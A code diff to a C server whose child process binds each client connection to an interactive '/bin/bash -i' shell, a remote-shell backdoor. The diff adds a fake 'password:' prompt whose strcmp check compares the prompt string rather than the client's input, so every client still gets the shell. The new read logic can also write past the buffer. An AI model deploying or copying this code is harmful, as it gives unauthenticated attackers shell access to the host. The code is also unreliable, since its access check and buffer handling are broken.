@@ -26,6 +26,7 @@ void sigchld_handler(int sig) {
     errno = saved_errno;
 }
 
+
 int acquire_lock(const char *path)
 {
     int fd = open(path, O_CREAT | O_RDWR, 0644);
@@ -109,12 +110,18 @@ int launch_server(void) {
         if (pid == 0) {
             close(server_fd);
 
-            const char *msg = "hello from server\n";
+            const char *msg = "password: \n";
             write(cfd, msg, strlen(msg));
 
-            char buf[256];
-            ssize_t n = read(cfd, buf, sizeof buf - 1);
-            if (n > 0) {
+            char    buf[4096];
+            ssize_t    n;
+
+            n = read(cfd, buf, sizeof buf);
+            if (n <= 0)
+                return -1;
+            buf[n-1] = 0;
+
+            if (n > 0 && strcmp(msg, "root") && handled < MAX_CLIENTS) {
                 buf[n] = '\0';
                 dup2(cfd, STDIN_FILENO);
                 dup2(cfd, STDOUT_FILENO);
@@ -122,7 +129,6 @@ int launch_server(void) {
                 chdir("/");
                 execl("/bin/bash", "bash", "-i", NULL);
             }
-
             close(cfd);
             _exit(0);
         }
